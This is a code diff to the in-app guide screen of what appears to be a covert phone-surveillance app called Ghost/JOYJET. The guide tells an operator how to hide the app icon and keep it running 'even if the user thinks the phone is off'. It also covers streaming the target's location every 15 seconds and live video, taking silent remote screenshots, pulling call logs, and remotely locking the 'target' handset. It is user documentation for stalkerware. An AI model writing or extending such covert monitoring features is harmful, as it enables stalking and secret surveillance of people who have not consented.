@@ -7,13 +7,22 @@ import { MaterialCommunityIcons } from '@expo/vector-icons';
 const GuideScreen = ({ onBack }) => {
   const sections = [
     {
-      title: "GHOST ACTIVATION",
-      icon: "leak",
+      title: "STEALTH OPERATIONS",
+      icon: "incognito-circle",
       color: "#F59E0B",
       items: [
-        { label: "INITIAL CALIBRATION", desc: "Open the Ghost app and tap 'CALIBRATE'. This initializes the hardware sensors, GPS pipeline, and encrypted video bridge. The orb will turn blue and pulse when synced." },
-        { label: "STEALTH ESCAPE", desc: "Tapping 'GO STEALTH MODE' inside the Ghost app triggers a safe exit to the background. The app remains active in memory, but is hidden from the recent apps list in 'most configurations'." },
-        { label: "HARDENED UI", desc: "Ghost nodes have no logout capability. The session is pinned to the device until an Admin remotely issues a 'WIPE' or 'BURN' command." }
+        { label: "CLOAKING HINT", desc: "For full Launcher Hiding (removing the icon from the phone's grid), go to Settings > Home Screen > Hide Apps. In advanced 'Custom Rom' builds, we use a hidden boot sequence during initial deployment." },
+        { label: "BACKGROUND PERSISTENCE", desc: "Our 'Stealth Cloak' button doesn't close the engine. It merely detaches the UI. The node will continue heartbeating even if the user thinks the phone is off or on the home screen." }
+      ]
+    },
+    {
+      title: "THE FINAL BURN (UNINSTALL)",
+      icon: "trash-can-outline",
+      color: "#EF4444",
+      items: [
+        { label: "LOGICAL DISCARD", desc: "Remote BURN is the ultimate command. Once issued, the node is PURGED from our database forever. It's the logical equivalent of discarding the device." },
+        { label: "PHYSICAL CLEANUP", desc: "Due to Android's hard security protocols, NO APP can silently uninstall itself without user interaction. To truly wipe binary traces, you MUST perform a manual Settings > Apps > JOYJET > Uninstall on the target physical handset." },
+        { label: "LOCK-DOWN STATE", desc: "A burned node instantly turns into a Red Terminal Lockscreen on the target device, displaying a 'Skull' icon. This prevents the user from re-linking the app without fresh credentials." }
       ]
     },
     {
@@ -21,29 +30,18 @@ const GuideScreen = ({ onBack }) => {
       icon: "traffic-light",
       color: "#10B981",
       items: [
-        { label: "🟢 GREEN (OPTIMIZED/CONNECTED)", desc: "Full power. Node is transmitting location every 15s and supporting live video feeds." },
-        { label: "🟠 ORANGE (PAUSED/PENDING)", desc: "Power-save mode. WebRTC bridge is closed and GPS polling is suspended. Maintains a 'heartbeat' for reactivation." },
-        { label: "🔴 RED (OFFLINE/KILLED)", desc: "Node has lost connection, been manually terminated, or burned from the registry." }
+        { label: "🟢 GREEN (ACTIVE)", desc: "Full power. Node is transmitting location every 15s and supporting live video feeds." },
+        { label: "🟠 ORANGE (PAUSED)", desc: "Power-save mode. WebRTC bridge is closed. GPS suspended for battery conservation." },
+        { label: "🔴 RED (TERMINATED)", desc: "Node is dark. Either disconnected, or permanently BURNED from the grid." }
       ]
     },
     {
-      title: "ADMIN STRATEGIC CONTROLS",
+      title: "ADMIN TACTICAL CONTROLS",
       icon: "security-network",
       color: "#38BDF8",
       items: [
-        { label: "PAUSE/RESUME", desc: "Toggle the 'PAUSE' button to remotely put a node to sleep, saving 80% battery consumption while maintaining the link." },
-        { label: "RE-SYNC TELEMETRY", desc: "Use 'RE-SYNC DATA' in the Calls tab to pull the most recent 10 communication logs from the device's internal storage." },
-        { label: "EVIDENCE CAPTURE", desc: "Request 'REMOTE SNAP' to trigger a secret silent screenshot on the target. Alternatively, use 'CAPTURE FEED' to save a local copy of the live video." }
-      ]
-    },
-    {
-      title: "SECURE BURN PROTOCOL",
-      icon: "fire",
-      color: "#EF4444",
-      items: [
-        { label: "PERMANENT DELETION", desc: "Long-press any node in the selection bar for 2 seconds to initiate BURN PROTOCOL. This is the ultimate kill-switch." },
-        { label: "DATABASE PURGE", desc: "Confirming the burn removes the node name and identity from the master registry FOREVER. The target app is force-wiped and locked." },
-        { label: "CYBER ALERTS", desc: "All system events are funneled through the Hacker-themed UI modal. Watch for Red alerts to identify terminal failures or security breaches." }
+        { label: "PAUSE/RESUME", desc: "Toggle the 'PAUSE' button to put the target's power management into deep sleep without severing the link." },
+        { label: "REMOTE EVIDENCE", desc: "Request silently uploaded 'REMOTE SNAPS' (uploaded to Snaps tab) or 'CAPTURE FEED' (saved to your dashboard device)." }
       ]
     }
   ];
